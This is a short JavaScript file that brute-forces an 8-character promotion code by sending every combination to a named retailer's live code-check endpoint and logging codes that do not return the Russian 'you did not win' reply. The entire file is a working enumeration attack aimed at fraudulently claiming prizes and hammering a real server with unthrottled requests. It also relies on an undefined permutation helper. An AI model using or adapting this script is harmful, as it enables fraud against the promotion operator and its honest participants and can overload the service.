const axios = require('axios');
const alphabet = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
    'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6',
    '7', '8', '9', '0'];

const CODE_LENGTH = 8;
const BUNCH_SIZE = 1000000;
const ACCOMMODATIONS_NUMBER = alphabet.length ** CODE_LENGTH;
const perms = PermutationsWithRepetition(alphabet, CODE_LENGTH);
let k = 0;

perms.each(function(v){
    let code = v.join('');
    axios.get(`https://7745.by/krynka/check-code/${code}`).then(res => {
        if (!res.data.message.includes('Сожалеем, Вы не выиграли.')) {
            console.log(res.data.message, code);
        }
    });
    k++;
    if (k % BUNCH_SIZE === 0) {
        console.log(Math.round(k / ACCOMMODATIONS_NUMBER * 10000) / 100  + '%');
    }
});
